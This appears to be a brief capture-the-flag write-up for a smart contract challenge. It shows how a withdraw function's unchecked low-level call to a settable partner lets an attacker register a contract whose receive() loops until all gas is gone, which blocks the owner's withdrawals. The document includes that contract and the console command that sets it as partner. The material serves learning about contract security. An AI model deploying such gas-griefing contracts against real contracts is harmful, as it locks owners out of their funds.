### Goals

Deny the owner from withdrawing funds when they call `withdraw()`

### Exploit

The withdraw function sends funds to `partner` which can be set with `setWithdrawPartner(address _partner)`. The main issue here is not checking the output of low-level call to partner. So we can set as a partner contract that will use all gas and the transaction will revert.

### Code

Deploy contract in Remix

```code
contract BadPartner {
  receive() payable {
        while (true) {}
    }
}
```

In console:

```
await contract.setWithdrawPartner(BAD_PARTNER_ADDRESS)
```

Done!
